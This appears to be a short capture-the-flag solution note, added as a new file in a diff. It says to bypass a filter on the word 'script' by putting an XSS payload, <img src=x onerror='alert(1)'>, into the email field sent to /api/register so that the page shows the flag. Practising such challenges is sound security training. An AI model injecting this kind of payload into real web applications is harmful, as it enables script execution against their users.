@@ -1,0 +1,4 @@
+Just send xss alert payload without script string in the email to /api/register
+<img src=x onerror='alert(1)'>
+
+The flag should be alerted from the webpage
